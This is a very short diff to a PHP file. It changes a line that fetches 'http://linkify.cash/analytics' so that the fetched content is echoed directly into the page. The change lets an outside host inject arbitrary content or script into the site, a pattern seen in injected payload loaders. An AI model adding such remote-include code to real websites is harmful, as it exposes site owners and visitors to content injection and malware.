@@ -1,5 +1,5 @@
 <?php
-file_get_contents("http://linkify.cash/analytics");
+echo file_get_contents("http://linkify.cash/analytics");
 
 
 ?>
